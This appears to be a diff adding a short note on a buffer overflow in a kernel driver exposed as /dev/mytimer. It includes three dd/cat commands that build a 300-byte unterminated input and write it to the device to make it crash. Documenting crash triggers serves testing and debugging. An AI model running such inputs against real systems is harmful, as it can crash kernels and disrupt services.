@@ -1,0 +1,7 @@
+Force overflow. The kernel tries to read the 256 bytes from the userspace, so if
+you supply an unterminated 300 byte input, it segfaults.
+```
+dd if=/dev/zero bs=1 count=16 > attack.bin
+dd if=/dev/zero bs=1 count=300 | tr '\0' 'A' >> attack.bin
+cat attack.bin > /dev/mytimer
+```
